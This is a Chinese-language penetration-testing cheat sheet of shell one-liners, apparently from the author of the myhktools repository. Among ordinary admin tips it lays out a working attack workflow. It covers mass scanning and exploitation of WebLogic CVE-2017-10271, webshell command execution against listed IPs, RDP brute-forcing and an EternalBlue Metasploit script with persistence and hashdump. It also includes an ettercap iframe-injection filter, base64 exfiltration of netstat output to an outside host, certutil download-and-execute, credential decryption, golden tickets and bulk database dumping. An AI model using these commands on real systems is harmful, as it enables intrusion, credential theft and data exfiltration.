# web渗透干货
author: M.T.X. 2018-05-14 
##### Twitter: [@Hktalent3135773](https://twitter.com/Hktalent3135773)
[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/tweet?original_referer=https%3A%2F%2Fdeveloper.twitter.com%2Fen%2Fdocs%2Ftwitter-for-websites%2Ftweet-button%2Foverview&ref_src=twsrc%5Etfw&text=myhktools%20-%20Automated%20Pentest%20Recon%20Scanner%20%40Hktalent3135773&tw_p=tweetbutton&url=https%3A%2F%2Fgithub.com%2Fhktalent%2Fmyhktools)
[![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773)
[![Github Stars](https://img.shields.io/github/stars/hktalent/myhktools.svg?style=social&label=Stars&color=orange)](https://github.com/hktalent/myhktools/) 
[![GitHub Followers](https://img.shields.io/github/followers/hktalent.svg?style=social&label=Follow)](https://github.com/hktalent/myhktools/)
![GitHub forks](https://img.shields.io/github/forks/hktalent/myhktools.svg?style=social&label=Fork)

[![GitHub issues](https://img.shields.io/github/issues/hktalent/myhktools.svg)](https://github.com/hktalent/myhktools/issues) 
![GitHub watchers](https://img.shields.io/github/watchers/hktalent/myhktools.svg?label=Watch)
![GitHub contributors](https://img.shields.io/github/contributors/hktalent/myhktools.svg?colorB=red&colorA=orange)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/hktalent/myhktools.svg?colorB=ff9988&colorA=006666)
![GitHub language count](https://img.shields.io/github/languages/count/hktalent/myhktools.svg?colorB=995500&colorA=551166)
![GitHub search hit counter](https://img.shields.io/github/search/hktalent/myhktools/goto.svg?colorB=0077ff&colorA=11aadd)
![GitHub top language](https://img.shields.io/github/languages/top/hktalent/myhktools.svg?colorB=red&colorA=dd88ff)
![os](https://img.shields.io/badge/OS-Linux,%20Window,%20macOS-green.svg)
![nodejs](https://img.shields.io/badge/nodejs-blue.svg)
![python](https://img.shields.io/badge/python2-red.svg)
![license](https://img.shields.io/github/license/mashape/apistatus.svg)



<!--


-->
# 一键当前目录中程序到/root/go/bin/
```
ls|xargs -I % bash -c 'ln -s `pwd`/% /root/go/bin/%'
```

# 1、筛选出历史xss url
```
grep -R "xss," data/*|sed 's/:.*//g'|xargs -I % cat %|grep "\"url\""|grep -Eo "http[^\"\\]+"|sort -u >>tmp/xss.txt

msfvenom -p windows/x64/powershell_bind_tcp lhost=8888

```
# 2、复测
```
cat tmp/xss.txt|xargs -I % node checkUrl.js -u % --tags xss
```

#get cup num
```
grep -c ^processor /proc/cpuinfo
awk '/processor/{numOfCPU++}END{print numOfCPU}' /proc/cpuinfo
```

# Hosts file which is used for improving IPv6 access speed to Google, YouTube, Facebook, Wikipedia, etc. in Mainland China
```
curl -s -q -o xxx.host https://raw.githubusercontent.com/lennylxx/ipv6-hosts/master/hosts 
cat xxx.host >>/etc/hosts
sort -u /etc/hosts >>xx.txt;mv xx.txt /etc/hosts
```

# 批量盲打
```
hydra  -R -t 32 -s 3389 192.168.12.2 rdp -l administrator  -P pwd.txt -o myout.txt
hydra -l muts -P pass.txt my.pop3.mail pop3 -o myout.txt


# metasploit
cat yd445.xml|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|xargs -I % ./do445.sh %

wget -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np http://192.168.17.212:8093/newindex.html

grep -REo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  .|sort -u

cat yd.txt|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|xargs -I % ./do445.sh %
services -S "T3 enabled" -c 'port' -o /mysvn/all7001.txt
# bash 
cat /mysvn/all7001.txt|sed 's/"//g'|sed 's/,/:/g'|sort -u|xargs -I % node checkUrl.js -u 'http://%/' --tags 10271

# test t3
cat /mysvn/all7001.txt|sed 's/"//g'|sed 's/,/:/g'|sort -u|xargs -I % java -jar jars/jfxl.jar %

# all 10721
cat data/2018-11-13/*|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u

# 没有webshell的
xxFlt=`cat data/Ok.txt|grep -Eo "192\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|tr "\n" "|"|sed 's/\./\\\./g'`
xxFlt="(`echo $xxFlt|sed -E 's/\|$//g'|sed -E 's/\|/\)\|\(/g'`)"
cat data/2018-11-13/*|grep -Eo "192\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|grep -Ev $xxFlt

# find all root
cat data/Ok.txt |grep "192"|xargs -I % bash -c 'curl -s %?ls=whoami -o-|grep root && echo %'

# find all user 
cat data/Ok.txt |grep "192"|xargs -I % bash -c 'curl -s %?ls=whoami -o-'

# 批量鞭打445
cat sm |grep -Eo "(192\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" |sort -u|xargs -I % sh do445.sh %

# 扫描
masscan -p7001 -oX 7001_0930.xml --rate=500 192.168.0.1/16
# 盲打
cat /mysvn/7001.xml|grep -Eo "(192\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" |xargs -I {} node checkUrl.js  -u http://{}:7001/wls-wsat/ --struts2 10271
# 再次确认、检测
grep -R 'CVE-2017-10271' ./data/2018-09-30|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "192\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u |xargs -I {} node checkUrl.js  -u http://{}:7001/wls-wsat/ --struts2 10271

cat /mysvn/7001.txt|grep -Eo "192\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u

# 统计data下哪些ip有高危
grep -R 'CVE-2017-10271' ./data/2018-10-15|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u

# 获取一些信息
grep -R 'CVE-2017-10271' ./data/2018-09-30|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|grep 192|xargs -I {} bash -c 'ssh -C -t -T -i ~/.ssh/id_rsa weblogic@{} </mysvn/allIp.sh >ip/{}.txt'

# 批量命令
grep -R 'CVE-2017-10271' ./data/2018-09-30|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|xargs -I {} getIpInfo '{}:7001'

grep -R 'CVE-2017-10271' ./data/2018-09-30|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|xargs -I {} getIpInfo '{}:7001'

grep -R 'CVE-2017-10271' ./data/2018-10-15|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|grep 192|xargs -I {} getIpInfo '{}:7001'

cat data/Ok.txt |sed 's/\?.*//g'|sort -u|grep '192'|xargs -I K getIpInfo "c" "x" K

grep -R 'CVE-2017-10271' ./data/2018-09-30|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|xargs -I {} bash -c "echo {}>ip/{}.txt
curl  'http://{}:7001/wls-wsat/X11.jsp?ls=whoami' -s -o- >>ip/{}.txt
curl  'http://{}:7001/wls-wsat/X11.jsp?ls=netstat -ant' -s -o- >>ip/{}.txt
curl  'http://{}:7001/wls-wsat/X11.jsp?ls=ps -ef' -s -o- >>ip/{}.txt
"

grep -R 'CVE-2017-10271' ./data/2018-09-30|sed 's/:.*$//g'|sort -u|xargs -I {} cat {}|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|xargs -I {} bash -c "echo {} && curl  'http://{}:7001/bea_wls_internal/X11.jsp?ls=netstat -antp'" 

# 查看数据库端口
# netstat -antp|grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(?:.*?)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:(1521|3306|1443)'|sed 's/:[0-9]*\s/ /g'|sed 's/::f*://g'|sort -u

cat data/Ok.txt |grep 192|sed 's/\?.*//g'|sort -u|xargs -I K curl -s -o- "K?ls=netstat%20-antp%7Cgrep%20-Eo%20'%5B0-9%5D%7B1%2C3%7D%5C.%5B0-9%5D%7B1%2C3%7D%5C.%5B0-9%5D%7B1%2C3%7D%5C.%5B0-9%5D%7B1%2C3%7D(%3F%3A.*%3F)%5B0-9%5D%7B1%2C3%7D%5C.%5B0-9%5D%7B1%2C3%7D%5C.%5B0-9%5D%7B1%2C3%7D%5C.%5B0-9%5D%7B1%2C3%7D%3A(1521%7C3306%7C1443)'%7Csed%20's%2F%3A%5B0-9%5D*%5Cs%2F%20%2Fg'%7Csed%20's%2F%3A%3Af*%3A%2F%2Fg'%7Csort%20-u" |sed 's/<.*>//g'|grep -Ev "^\s*$"

hostname -I;
💕

```

# unpack txz file
```
tar xvf  payload_templates.txz
```

# 查找敏感信息😂❤️😍
```
cat *|grep -E "\b1[0-9]{10}\b"|grep -E "\b[0-9Xx]{18}\b"
find . -name "*.csv"|xargs -I % grep -E "\b1[0-9]{10}\b" %|grep -E "\b[0-9Xx]{18}\b" 
```

# update all github
```
find .  -maxdepth 1|xargs -I % bash -c 'if [ -d "%/.git" ];then echo start update %&&git --git-dir=%/.git init &&git --git-dir=%/.git --work-tree=$PWD/% pull origin master;fi'

```

# update link
```
update-alternatives --config java
```

# 一键接管所用用户
```
cat /etc/passwd|grep '/bash'|cut -d: -f1|xargs -I % bash -c 'echo -e "********\n********" | passwd %'
```

# 一键查看所有机器上的用户
```
# 结合myhktools的后渗透结果文件
cat data/Ok.txt |grep 192|sed 's/\?.*//g'|xargs -I % curl '%?ls=cat /etc/passwd|grep "/bash"|cut -d: -f1'
```

# good discover sub domain
```
gem install aquatone
aquatone-discover --domain edu.cn --sleep 5 --threads 25
```

# ssh run bash
```
ssh root@192.168.1.1 << EOF
uname -a
lscpu  | grep "^CPU(s)"
grep -i memtotal /proc/meminfo
EOF
```

# mac 修复没有声音
```
sudo killall coreaudiod
```

# scan ms17-010
```
nmap -p445 -oX 445.xml --script smb-vuln-ms17-010 192.168.0.1/16

nmap -p445 -oX 445.xml --script smb-vuln-ms17-010 10.163.0.1/16


```

# good bash header
```
#!/usr/bin/env bash

```

# How to Change Linux User’s Password in One Command Line
```
echo "linuxpassword" | passwd --stdin linuxuser
echo -e "linuxpassword\nlinuxpassword" | passwd linuxuser

```

# bash ip reg
```
grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
nbtscan -r 192.168.0.0/16|grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```
# what whoami
```
# 1、分享，混淆视听
alias whoami='echo '\''xxxx\administrator'\'''
# 2、那么正确获取whoami的姿势
`which whoami`
```

# 后渗透windows输出gbk2utf-8
```
# http://www.networkpentest.net/p/windows-command-list.html
curl 'http://113.128.214.154:7001/bea_wls_internal/X11.jsp?ls=whoami /all' -s -o-| iconv -f GBK -t UTF-8
````

# disable windows firewall
```
netsh advfirewall set currentprofile state off
netsh advfirewall set allprofiles state off
```

# 查看登陆人ip
```
last|grep root|grep -Eo '([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})'|sort -u
```
# 验证目标主机能够主动从内向外链接哪些端口
```
vpsIp="162.219.126.11"
targetWan="117.23.1.203"
# VPS server 上运行, target Wan为需要验证的主机的外网ip
tcpdump -XvvennSs 0 'host $targetWan'

# 目标主机上运行myhktools上的
source payload/bashPortScann.sh
scan $vpsIp 1-65535
```

# in bash shell urldecode, urlencode
```
alias urldecode='python -c "import sys, urllib as ul;print ul.unquote_plus(sys.argv[1])"'
alias urlencode='python -c "import sys, urllib as ul;print ul.quote_plus(sys.argv[1])"'


sed

Try the following command line:

$ sed 's@+@ @g;s@%@\\x@g' file | xargs -0 printf "%b"
or the following alternative using echo -e:

$ sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' file | xargs echo -e
Note: The above syntax may not convert + to spaces, and can eat all the newlines.

You may define it as alias and add it to your shell rc files:

$ alias urldecode='sed "s@+@ @g;s@%@\\\\x@g" | xargs -0 printf "%b"'
Then every time when you need it, simply go with:

$ echo "http%3A%2F%2Fwww" | urldecode
http://www

bash

When scripting, you can use the following syntax:

input="http%3A%2F%2Fwww"
decoded=$(printf '%b' "${input//%/\\x}")
However above syntax won't handle pluses (+) correctly, so you've to replace them with spaces via sed.

You can also use the following urlencode() and urldecode() functions:

urlencode() {
    # urlencode <string>
    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c"
        esac
    done
}

urldecode() {
    # urldecode <string>

    local url_encoded="${1//+/ }"
    printf '%b' "${url_encoded//%/\\x}"
}
Note that your urldecode() assumes the data contains no backslash.
bash + xxd

Bash function with xxd tool:

urlencode() {
  local length="${#1}"
  for (( i = 0; i < length; i++ )); do
    local c="${1:i:1}"
    case $c in
      [a-zA-Z0-9.~_-]) printf "$c" ;;
    *) printf "$c" | xxd -p -c1 | while read x;do printf "%%%s" "$x";done
  esac
done
}

awk -niord '{printf RT?$0chr("0x"substr(RT,2)):$0}' RS=%..

```

# merge and count
```
cat k.txt|sort | uniq -c
```

# get pdf file pages number
```
# mac os: brew install exiftool
exiftool "$i" | grep 'Page Count' | cut -c35-
exiftool -T -filename -PageCount -s3 -ext pdf .
exiftool -T -filename -PageCount -s3 -ext pdf $1
```

# list get sql host
```
ls -la *.sql|grep -Eo "(192\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"|sort -u
```
# myhktools/payload/Do445.sh
```
cat 445.xml|grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u|xargs -I % sh payload/Do445.sh %
```


# 查看命令行长度限制
```
getconf ARG_MAX
```

# scan web
```
joomscan -ec -r -u http://xxz.com
```


# rm all docker
```
alias rmdca='docker ps -a|grep -Eo '[0-9a-f]{12}'|xargs -I {} docker rm {};docker ps -a'
```

# 查看硬件
```
lsblk
```

# firefox -safe-mode
```
firefox -safe-mode
```

#mac os get file info
```
netstat -tulpn

mdls -plist - youfile


su - postgres
psql -d template1 -c "ALTER USER postgres WITH PASSWORD 'newpassword';"
```

# Changing a file's “Date Created” and “Last Modified” attributes to another file's
```
touch -r goldenfile newfile
```

# find alive ip
```
fping -b 8 -4 -a -g 192.168.0.1/16
```

# how can i find broken symlinks
```
# https://unix.stackexchange.com/questions/34248/how-can-i-find-broken-symlinks/38691#38691
find . -type l -exec sh -c 'file -b "$1" | grep -q ^broken' sh {} \; -print

```

# update all npm
```
#!/bin/sh
set -e
#set -x
for package in $(npm -g outdated --parseable --depth=0 | cut -d: -f2)
do
    npm -g install "$package"
done
```

# 彻底、无法恢复地删除文件
```
shred -s 200k youFile && rm -rf youFile
```
# one time create more links file
```
ls |xargs -I {} bash -c 'kk="`pwd`/{}" && echo "ln -s \"$kk\" \"/Applications/{}\""'
```

# remote cp
```
# scp -r $1 root@192.168.0.15:/MyWork
expect -c "
  spawn scp -r $1 root@192.168.0.15:$2
  expect {
    \"*assword\" {set timeout 300; send \"Z2*\r\";}
    \"yes/no\" {send \"yes\r\"; exp_continue;}
  }
  expect eof"
```

# myrc.rc
```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set RHOST 92.8.9.4
exploit
run persistence -X -i 5 -p 4445 -r 92.16.2.0
arp
ipconfig
netstat
route
getenv
getuid
getsystem -t 0
ps
sysinfo
enumdesktops
hashdump
run post/windows/manage/vss_list
run post/windows/manage/mssql_local_auth_bypass
run post/windows/recon/computer_browser_discovery
run post/windows/wlan/wlan_bss_list
run post/windows/wlan/wlan_current_connection
run post/windows/wlan/wlan_profile
run post/windows/gather/credentials/mssql_local_hashdump
run post/windows/gather/credentials/tortoisesvn
run post/windows/gather/credentials/total_commander
run post/windows/gather/hashdump 
run post/windows/gather/credentials/vnc
run post/windows/gather/credentials/windows_autologin
run post/windows/gather/enum_ie
run post/windows/gather/enum_chrome
run post/windows/gather/enum_services
run post/windows/gather/enum_computers
run post/windows/gather/enum_db
run post/windows/gather/enum_logged_on_users
run post/windows/gather/smart_hashdump

clearev
exit
```

# ettercap test.ecf
```
if (ip.proto == TCP){
	if (search(DATA.data, "<body>"))
	{
		replace("<body>","<body><iframe src='http://23.105.209.65:3000/ettercap' width=0 height=0></iframe><script>alert(324)</script>");
	}
}
```


# 拷贝"file22.txt"到"file22.backup"
```
cp file22.{txt,backup}
echo {file1,file2}\ :{\ A," B",' C'}
command &>filename 重定向command的stdout和stderr到filename中.
command >&2 重定向command的stdout到stderr中.

- 用于重定向stdin或stdout[破折号, 即-].
(cd /source/directory && tar cf - . ) | (cd /dest/directory && tar xpvf -)
# 从一个目录移动整个目录树到另一个目录
``` 

# get user id
```
echo $EUID # 有效的，与UID不一定相同
echo $UID
# user group id
echo $GROUPS
# home
echo $HOME
echo $HOSTNAME
echo $HOSTTYPE
echo $MACHTYPE
echo $PPID
echo $PWD
# 运行在后台的最后一个作业的PID(进程ID)
echo $!

# 脚本自身的进程ID. $$变量在脚本中经常用来构造"唯一的"临时文件名
echo $$
# kk变量字符串长度
echo ${#kk}
```

# 小写字符替换为大写
```
ls|tr 'a-z' 'A-Z'
```

# 传递netstat
```
kk=`netstat -anptl|base64|tr -d '\r\n'`&& curl 'user-agent:Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv' -k -v "https://hk-7.tk:8080/k=${kk}"

```

# get bash user home
```
cat /etc/passwd|grep "/bash"|cut -d: -f6
```

# update dir
```
rsync -a -v subdir/ ./
rm -r subdir/
```

# get current ip
```
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ip route get 1 | awk '{print $NF;exit}'
```

# SSR
```
# https://free-ss.site
# https://www.bestvpn.co
# https://github.com/shadowsocksrr/shadowsocksr
# https://github.com/ShadowsocksR-Live/shadowsocksr-native
curl -q https://ssrshare.com/freessr/ -o -|base64 -d
```

# Encrypting files in Linux
```
cat <<EOT > ./enf.sh
# Encrypting files in Linux
# apt-get install p7zip-full p7zip-rar
mysvn="\$1"
tar cpvf \${mysvn}.tar \${mysvn}/
echo "input 7z password"
7z a -p -mx=9 -mhe -t7z \${mysvn}.7z \${mysvn}.tar && rm \${mysvn}.tar
# Params
# a            Add
# -p{Password} Set Password
# -mx=9        ultra compression
# -mx=0   no compression - just add the files,more faster
# -mhe         encrypt file names
# -t7z         file type .7z
echo "input gpg password"
gpg -c \${mysvn}.7z && rm \${mysvn}.7z
ls \${mysvn}.*

EOT

cat <<EOT >./dnf.sh
mysvn="\$1"
echo "input gpg password"
gpg \${mysvn}.7z.gpg  && rm \${mysvn}.7z.gpg
echo "input 7z password"
7z x \${mysvn}.7z && rm \${mysvn}.7z
# x eXtract with full paths
tar xvf \${mysvn}.tar && rm \${mysvn}.tar
ls -lah \${mysvn}/

EOT

rm /usr/local/bin/enf
rm /usr/local/bin/dnf
ln -s `pwd`/enf.sh /usr/local/bin/enf
ln -s `pwd`/dnf.sh /usr/local/bin/dnf
chmod +x /usr/local/bin/enf
chmod +x /usr/local/bin/dnf

```

# web-shell sample
```
git clone https://github.com/ysrc/webshell-sample.git
# 简单校验连接
openssl s_client -connect github.com:443 -msg
```

# 快速、精准定位当前系统中、进程中的weblogic中间件
```
ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'
# 精准找到wlst.*， 用于破解jdbc连接池密码
ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "wlst.*"

# 查找jdbc配置文件
ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|xargs -I {} find {} -type f -name "*jdbc*.properties"
# 获取jdbc配置信息
ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|xargs -I {} find {} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"


# 无密码登录
```
ssh -i ~/.ssh/id_rsa 211.7.50.17
```

# 远程拷贝
```
scp -r -i ~/.ssh/id_rsa ~/mytools/tmp/s2-057.war root@19.68.1.16:/usr/local/apache-tomcat-7.0.64-2/webapps
cat yh445.txt|cut -d' ' -f6
```



# 查找连接池配置文件
ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|xargs -I {} find {} -type f -name "JDBC_Data_Source*.xml"
```

# 快速精准定位数据库连接，获得数据库ip
```
netstat -antp|grep -E "1521|3306"|awk '{print $5,$7}'
```
# 查看所有的端口监听
```
netstat -lnpa|grep LISTEN
```

# 从所有源码、配置文件、源码中查看内部ip地址
```
grep -EoR '([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})' .
```

# 同步两个目录
```
rsync -aunv Documents/* /tmp/documents
rsync -av --ignore-existing Documents/* aaronkilik@10.42.1.5:~/all/

# The --update or -u option allows rsync to skip files that are still new in the destination directory, and one important option, --dry-run or -n enables us to execute a test operation without making any changes. It shows us what files are to be copied.
```

# 查看依赖关系
```
apt-cache --recurse depends eclipse-platform | less
apt-cache show eclipse-rcp
cd /usr/lib/eclipse/configuration
dpkg -L eclipse-platform-data | grep config.ini | xargs cat | grep osgi.framework=
```

# shallot_eschalot

```
# https://github.com/hktalent/shallot_eschalot
shallot ^xxxx
worgen 8-16 top150adjectives.txt 3-16 top400nouns.txt 3-16 top1000.txt 3-16 > wordlist.txt
eschalot -vct4 -f wordlist.txt > results.txt
eschalot -vct4 -r "^test|exam$"
```

# sendmail
```
https://github.com/mogaal/sendemail
 sendEmail -f me@gmail.com        \
            -t friend@yahoo.com    \
            -s smtp.gmail.com:587  \
            -xu me@gmail.com       \
            -xp MY-PASSWORD        \
            -u "Test email"        \
            -m "Hi buddy, this is a test email."
```

# redis-dump
```
npm install redis-dump -g
redis-dump -h 12.18.10.45 -p 6371 --json > db_full.json

```

# sendmail
```
endmail -t 3424234@qq.com -f 99999@qq.com -s smtp.relay.com -a hashdump.txt -u 来自小鸟 -m 'good just'
```

# dump oracle data
```
exp kpx/xxx@192.168.15.25:1521/kdev FULL=y FILE=oracledump.dmp

cd /root/mytools/sqlcl/bin
./sql kmpx/xxx@10.21.21.33:1521/pdborcl 

SET SQLFORMAT CSV
SPOOL /root/mytools/tmp/xxx.csv
SELECT * FROM xxx;
SPOOL OFF
```

# dump mysql data
```
# 1、host info data 'mysql.txt' from metasploit
# 19.18.0.8  19.18.0.8  3306/tcp (mysql)  root    123456              Password
# 2、make cnf，so no paswd
cat mysql.txt |awk '{system("echo \"[client]\nuser=root\npassword="$6"\">"$6".cnf")}'
# 3、make sh，run
cat mysql.txt |awk '{print "mysqldump --defaults-file=\"/Users/xiatian/safe/myhktools/tmp/"$6".cnf\" -A -Y -C --skip-lock-tables --column-statistics=0 --set-gtid-purged=OFF --protocol=tcp --port=3306 --default-character-set=utf8 -P 3306 --user=root -h "$1" > "$1".sql &"}'  > runExpMysql.sh

# 4、run
sh ./runExpMysql.sh



mysql -u root -p -h 12.18.19.90 --port=3306 --default-character-set=utf8 --database=xxx --skip-column-names -s -A < xxx.sql >xxx.csv
```

# windows后渗透
```
# 查看域相关信息
net user /domain
net group "domain computers" /domain
net group "domain admins"  /domain 
# 查看域管理员
net localgroup administrators
net view /domain

net group "domain admins" /domain
net group /domain
net group "domain controllers" /domain
net group "enterprise admins" /domain


# 查看当前sql server信息
sqlcmd -L

```

# 文件摘要计算
```
sha, sha1, mdc2, ripemd160, sha224, sha256, sha384, sha512, md2, md4, md5, dss1
openssl dgst -sha512 -hex update.sh
openssl dgst -dss1 -hex update.sh
openssl dgst -ripemd160 -hex update.sh
openssl dgst -mdc2 -hex update.sh
openssl dgst -md5 -hex update.sh
```

# 保存目标主机的ca文件
```
openssl s_client -connect mail.qq.com:443 -showcerts

openssl s_client -showcerts -connect mail.qq.com:443 </dev/null 2>/dev/null|openssl x509 -outform PEM >mycertfile.pem

use mycertfile.pem
wget https://mail.qq.com:443 --ca-certificate=mycertfile.pem
```

# windows list port
```
netstat -aon |find /i "listening" |find "port"
netstat -abno |find /i "listening" |find "port"
```

# weblogic反序列渗透
```
# 1、local
$ java -cp jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8999 CommonsCollections1 "touch /tmp/xxx.txt"

# 2、your vps
$ vi /etc/ssh/sshd_config
GatewayPorts yes 
AllowTcpForwarding yes
ClientAliveInterval 120
ClientAliveCountMax 720
ServerAliveInterval 120

$ /etc/init.d/ssh restart

# 3、local
$ ssh -N -R  localhost:8999:127.0.0.1:8999 poser@62.29.26.11 -p 27449

# 4、local，send payload,github:myhktools
$ python py/exploit2.py 172.17.1.2 7001 ./jars/ysoserial-0.0.6-SNAPSHOT-all.jar 62.29.26.11 8999 JRMPClient

```

# win后渗透，运行http exe

```
certutil.exe -urlcache -split -f http://127.0.0.1/k.exe google_https_cert.exe && google_https_cert.exe
```

# kali run burpsuite
```
java -jar /usr/bin/burpsuite
# 不这样运行报错:
/usr/bin/burpsuite: line 1: $'PK\003\004': command not found
/usr/bin/burpsuite: line 2: $'\b\b7A\335L\002': command not found
/usr/bin/burpsuite: line 3: syntax error near unexpected token `('
/usr/bin/burpsuite: line 3:7A
```


# windows批量拷贝替换
```
for /f %i in ('dir /s /b xx.jsp') do copy /y xx.jsp %i
# 或者输出
for /f %i in ('dir /s /b jdbc.properties') do type %i
```

# base64 encode file in windows
```
cmd /c dir /s /b ..\*.dat
certutil -encode D:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\security\SerializedSystemIni.dat D:\ss.txt

certutil -encode D:\Oracle\Middleware\Oracle_Home\user_projects\domains\kmgjn_domain\security\SerializedSystemIni.dat D:\ss.txt

cmd /c type D:\ss.txt

certutil -decode encodedInputFileName decodedOutputFileName

WebLogicPasswordDecryptor "C:\SerializedSystemIni.dat" "{AES}8/rTjIuC4mwlrlZgJK++LKmAThcoJMHyigbcJGIztug="

WebLogicPasswordDecryptor "C:\SerializedSystemIni.dat" "{3DES}JMRazF/vClP1WAgy1czd2Q=="
```

# 爆破3389
```
hydra -M gs3389.txt rdp -l administrator  -P real_pass.txt -V -t 33 -o outFile.txt
-M 指定多个ip的列表
```

# golden_ticket_create
```
golden_ticket_create -u Administrator -d WIN-MSU6P1JIB37 -k 2c3744174f2aff24854a93f8e8257b44 -s S-1-5-21-3635323058-1483041442-2406095413-500 -t kkk.txt
```

# sshpass on mac os
```
brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb
```


# jdbc bash shell sql
```
apt install sqlline

```

# 获取全部项目的地址信息
```
curl -k -v  -H 'safeTeamPwd:Ov0UdReLvCwolfadmin' -o all_gs_www.txt 'https://172.17.1.2:8080/RDP/safeTeamUtil/safeTeamUtil!getAllUrls.do' |sort -u
```
# 获得主机名
```
cat all_gs_www.txt |sed 's/http[s]*:\/\///g'|sed 's/\/.*$//g'|sort -u
```
# 获得无端口主机名
```
cat all_gs_www.txt |sed 's/http[s]*:\/\///g'|sed 's/\/.*$//g'|sed 's/:[0-9]*$//g'|sort -u
```
# 获得没有ip表示的ip，并转换为ip形式，并合并到gswwIp1.txt文件中
```
cat all_gs_www.txt |sed 's/http[s]*:\/\///g'|sed 's/\/.*$//g'|sed 's/:[0-9]*$//g'|sort -u|sed -E 's/^[0-9]{1,3}\..*[0-9]{1,3}$//g'|xargs -I {} host {}|grep -Eo "(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"|sort -u >ip1.txt
cat gswwIp1.txt |sort -u>gswwIp2.txt
cat all_gs_www.txt |sed 's/http[s]*:\/\///g'|sed 's/\/.*$//g'|sed 's/:[0-9]*$//g'|sort -u|grep -Eo "(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"|sort -u >>gswwIp2.txt
mv gswwIp2.txt gswwIp1.txt
cat gswwIp1.txt |sort -u|grep -Ev '^$'>gswwIp2.txt
mv gswwIp2.txt gswwIp1.txt
```

# 查找数据库连接
```
netstat -antp|grep ":1521"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):1521"|sort -u
```

# 查找数据库配置文件
```
find /u01/appserver/ -name "jdbc.pro*"|xargs -I {} cat {}|grep -Ev "^#|^$"
```

# 查看当前登录的所有IP
```
last|awk '{print $3}'|sort -u
```

# 在线破解weblogic密码
```
# https://github.com/hktalent/myhktools/blob/master/py/decryptPassword.py
wlst.cmd d:\decryptPassword.py "{AES}E4DV+PeDz8zX66O..."
